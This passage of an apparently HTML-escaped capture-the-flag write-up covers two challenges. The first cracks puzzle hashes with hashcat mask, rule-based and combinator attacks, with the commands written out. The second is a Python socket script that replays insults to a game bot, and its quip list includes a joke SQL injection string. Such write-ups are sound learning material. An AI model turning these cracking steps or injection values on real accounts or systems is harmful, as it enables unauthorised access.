    &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;stdout&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;write(str(ba))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;challenge-22:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 22&lt;/h1&gt;

&lt;p&gt;Hash cracking. I am new to this, but boy did I enjoy this challenge because I learned
a lot! I decided to use &lt;a href=&#34;https://hashcat.net/oclhashcat/&#34;&gt;hashcat&lt;/a&gt; for all the hashes.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s begin:&lt;/p&gt;

&lt;h2 id=&#34;hash-1:00aa8d5840836b6803fb0a2203b66750&#34;&gt;hash 1&lt;/h2&gt;

&lt;p&gt;A 16 digit pin takes a long time to bruteforce, but the hint tells me that the only
numbers in the PIN are 1, 7, 9, and 0.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;hashcat -m100 -1 1790 --pw-min=16 --pw-max=16 -a3 hash1.txt ?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;time taken: 4:40 minutes&lt;/p&gt;

&lt;h2 id=&#34;hash-2:00aa8d5840836b6803fb0a2203b66750&#34;&gt;hash 2&lt;/h2&gt;

&lt;p&gt;This one had me stumped for ages, because it was hard to bruteforce and hashcat didn&amp;rsquo;t support
sha384. Luckily I found &lt;a href=&#34;https://crackstation.net/&#34;&gt;Crackstation&lt;/a&gt; where I entered the hash
and was immediately rewarded with the correct answer. Alternatively writing a brute forcer in Python
and using the Rockyou wordlist would also have worked.&lt;/p&gt;

&lt;h2 id=&#34;hash-3:00aa8d5840836b6803fb0a2203b66750&#34;&gt;hash 3&lt;/h2&gt;

&lt;p&gt;Here I employed hashcat&amp;rsquo;s &lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=rule_based_attack&#34;&gt;rule based attacks&lt;/a&gt;
 to make myself a new wordlist based on the given rules.
First I needed to run the &lt;code&gt;toggle&lt;/code&gt; rule to generate the words with one upper case char.
Then I ran a the substituion rule (which is the &lt;code&gt;leetspeak.rule&lt;/code&gt;). Now I had a
list of words that had one substitution and one upper case letter. Only the
punctuation and digit missing now. For this step I wrote a python script
that would generate the required rule table:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;puncs&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;! @ # $ % ^ &amp;amp; * ( ) _ + { } [ ] : ; . , / ? ~ `&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;split()&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;nums&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;1 2 3 4 5 6 7 8 9 0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;split()&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;fh&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;pn.rule&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;


&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;punc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;puncs:&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;nums:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;fh&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;write(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;$%s$%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(punc,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;n))&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;fh&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;write(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;$%s$%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(n,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;punc))&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;fh&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;close()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I then used this rule to run it over the word list, then&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;hashcat -m0 hash3.txt final.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;to get the plaintext in 3 seconds.&lt;/p&gt;

&lt;h2 id=&#34;hash-4:00aa8d5840836b6803fb0a2203b66750&#34;&gt;hash 4&lt;/h2&gt;

&lt;p&gt;Here I needed to run hashcat&amp;rsquo;s combinator attack a few times on the word list.
What this does is append each word of a wordlist to every other word.
Running this a few times will give me the list I need:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;hashcat -a1 wordlist.txt --stdout &amp;gt; pass1.txt
hashcat -a1 -m1400 hash4.txt pass1.txt
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Scoop the plaintext in 8 minutes.&lt;/p&gt;

&lt;h1 id=&#34;challenge-23:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 23&lt;/h1&gt;

&lt;p&gt;Once connected to the server I have to insult the bot quickly and smartly. But who is
smarter than the bot? No one that&amp;rsquo;s who. Except perhaps the bot itself. In essence
what needs to be done is get the taunts from the master and play them back
to him. Then use his replies as respsonses to his taunts.&lt;/p&gt;

&lt;p&gt;I figure there&amp;rsquo;s two ways of doing this;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1. Connect the bot to itself via a client that relays the messages between the two
2. Record the quips and play them back automatically as needed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I plumped for option 2 and hoped there wouldn&amp;rsquo;t be too many quips to harvest. Having
played against the bot a few times I managed to get myself the list of comebacks and
wrote a Python script to pwn the Nerd Master&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;random&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;re&lt;/span&gt;


&lt;span style=&#34;color: #f8f8f2&#34;&gt;challs&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Pna lbh ernq guvf?&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;EBG13 vf sbe ynzref.&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You&amp;#39;re so slow, you must have been written in BASIC.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;At least I don&amp;#39;t have memory leaks like you.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Go 127.0.0.1 to your mummy.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;go 127.0.0.1 to your mom&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I have more friends than you.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Yeah, but only until you update your Facebook profile with a real picture of you!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You should leave your cave and socialize a bit.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I&amp;#39;m not anti-social. I&amp;#39;m just not user friendly.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;This fight is like a hash function - it works in one direction only.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Too bad you picked LM hashing.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I bet you don&amp;#39;t even understand binary.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Sure I do. Me and you, we are 10 different kind of persons.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;1f u c4n r34d th1s u r s70p1d.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You better check your spelling. Stoopid has two &amp;#39;o&amp;#39;s.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;After loosing to me, your life won&amp;#39;t be the same anymore.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;A Life? Cool! Where can I download one of those?&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You&amp;#39;ll be 0xdeadbeef soon.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Not as long as I have my 0xcafebabe.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Af7ter th1s f1gh7, I w1ll pwn ur b0x3n.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Check your settings - you seem to have chosen the Klingon keyboard layout.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I have more friends than you.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Yeah, but only until you update your Facebook profile with a real picture of you!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I&amp;#39;ll check you out - any last words?&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;svn:ignore&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Tell me your name, hobo. I need to check your records.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;My name is bob&amp;#39;; DROP TABLE VALJ;--&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;format C:&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Specified drive does not exist.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You must be jealous when seeing my phone&amp;#39;s display.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Not really - Your pixels are so big, some of them have their own region code!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Ping! Anybody there?&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;ICMP type 3, code 13: Communication Administratively Prohibited&amp;quot;&lt;/span&gt;
          &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;tosends&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;challs&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;removekey&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(d,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;key):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;dict(d)&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;del&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;r[key]&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;sendchall&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(s,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;chall):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sendall(challs[chall]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\r&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;


&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;netcat&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(hostname,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;port):&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;global&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;tosends&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;socket(socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;AF_INET,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;SOCK_STREAM)&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;connect((hostname,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;port))&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;recv(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1024&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Received:&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;repr(data)&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Speechless?&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;or&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Go play with your toys, yellow-belly.&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;break&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Do you feel brave enough to challenge the mighty nerdmaster? (y|n)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sendall(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;y&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;m&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;re&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;search(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;.*YOUR TURN ----&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;n&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data)&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;m:&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;tosends&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;keys()[random&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;randint(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;len(tosends)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)]&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sendall(chal&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;send challenge: &amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;tosends&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;removekey(tosends,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal)&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;



        &lt;span style=&#34;color: #f8f8f2&#34;&gt;m&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;re&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;search(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;.*MY TURN ----&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;n(.*)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;n&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data)&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;m:&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;groups()[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;
